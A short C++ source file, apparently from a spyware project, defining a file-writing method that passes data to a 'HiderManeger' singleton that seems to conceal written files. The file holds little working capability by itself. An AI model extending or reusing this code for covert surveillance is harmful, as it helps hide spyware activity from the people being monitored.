#include "Contraption.h"

// write mode == 1, means overWrite
// write mode == 2, means Append
int Contraption::writeFile(const std::string& fileName, char buffer[], uint32_t len, uint32_t writeMod) 
{
    // std::cerr << "spyware: contraption tring to write file\n";
    if (writeMod != M_OVERWRITE) {
        std::cerr << "spyware: contraption tring to write non implemented mode\n";
        return 1; // not implemented sorry ):
    }
    int bufferLen = strlen(buffer);
    if (bufferLen == 0 || len == 0) {
        std::cerr << "spyware: contraption not writing because buffer is empty\n";
        return 0;
    }

    HiderManeger& hiderManeger = HiderManeger::getInstance();
    hiderManeger.writeFile(fileName,buffer, len, writeMod);
    // std::cerr << "Writing to file " << fileName << std::endl;
    // std::ofstream outputFile(fileName);

    // if (outputFile.is_open()) {
    //     outputFile.write(buffer, std::min((uint32_t)len, (uint32_t)bufferLen + 1));
    //     outputFile.close();
    // } else {
    //     std::cerr << "Error: Unable to open file for writing." << std::endl;
    // }

    return 0;
}
